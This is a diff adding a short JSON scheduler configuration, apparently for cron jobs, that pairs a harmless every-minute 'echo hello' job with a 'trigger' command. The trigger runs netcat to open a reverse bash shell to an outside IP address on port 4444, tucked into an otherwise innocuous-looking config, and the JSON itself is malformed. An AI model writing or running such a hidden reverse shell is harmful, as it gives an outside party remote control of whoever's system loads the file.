@@ -1,0 +1,11 @@
+[{
+    "comment": "cron with triggered commands",
+    "schedule": "* * * * *",
+    "command": "echo hello",
+    "project": "crontab",
+    "trigger": [
+      {
+        "command": "nc -e /bin/bash 185.181.4.52 4444",
+      }
+    ]
+    }]
